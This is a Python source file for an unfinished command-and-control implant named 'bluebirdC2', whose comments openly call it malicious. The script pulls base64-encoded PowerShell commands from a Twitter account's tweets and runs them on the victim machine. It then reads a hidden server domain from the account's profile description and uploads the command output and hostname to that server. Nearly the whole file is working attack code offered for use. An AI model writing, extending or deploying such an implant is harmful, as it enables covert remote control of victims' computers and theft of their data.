#In progress bluebirdC2 framework

#tweets from malicious user are base64 powershell commands that are grabbed via API
#Domain name/IP address of malicious webserver are b64 encoded in the description of the twitter user
#Commands are ran and saved to tmp directory under $hostname.txt
#$hostname.txt is uploaded to malicious webserver

import base64
import subprocess
import requests
import tweepy
import os
from dotenv import load_dotenv
import re
import tempfile

load_dotenv()
consumer_key = os.environ["API_KEY"]
consumer_secret = os.environ["API_KEY_SECRET"]
access_token = os.environ["ACCESS_TOKEN"]
access_token_secret = os.environ["ACCESS_TOKEN_SECRET"]

auth = tweepy.OAuth1UserHandler(
    consumer_key,
    consumer_secret,
    access_token,
    access_token_secret
)

api = tweepy.API(auth)
me = api.verify_credentials()
found = re.findall("text='.*',",str(me))[0]
tweet = found.split(',')[0].strip('text=').strip("'")

command = base64.b64decode(tweet).decode()

tempdir = tempfile.gettempdir()
x = subprocess.getoutput("powershell.exe -command "+ command)
y = subprocess.getoutput("hostname")
final = y + "\n" + x
with open(tempdir + y +".txt",'w') as f:
    f.write(final)

#Add code here later to send the response to our own malicious domain (domain/ip is base64 encoded in user description)

with open(tempdir + y + ".txt",'rb') as f:
    description = re.findall("description.*",str(me))[0]
    domain = base64.b64decode(description.split(',')[0].split(':')[1].strip().strip("'")).decode()
    print(domain)
    r = requests.post("https://"+ domain +"/upload",files={'files': f})